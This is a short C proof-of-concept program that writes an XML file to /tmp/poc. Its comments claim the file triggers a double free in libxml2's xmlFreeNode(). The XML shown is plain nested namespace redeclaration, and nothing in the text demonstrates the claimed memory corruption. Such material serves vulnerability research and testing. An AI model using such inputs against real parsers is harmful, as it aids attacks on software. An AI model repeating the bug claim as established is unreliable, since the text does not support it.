#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* XML payload that triggers bad_free in xmlFreeNode() */
    /* This uses malformed namespace declarations that cause the SAX2 */
    /* parser to free a node twice during start element processing */
    const char *xml = "<root xmlns:n=\"http://example.com/ns\">"
                      "<n:child xmlns:n=\"http://example.com/ns2\">"
                      "<n:grandchild xmlns:n=\"http://example.com/ns\"/>"
                      "</n:child>"
                      "</root>";
    size_t xml_len = strlen(xml);

    /* Write raw XML payload - no header */
    fwrite(xml, 1, xml_len, f);

    fclose(f);
    return 0;
}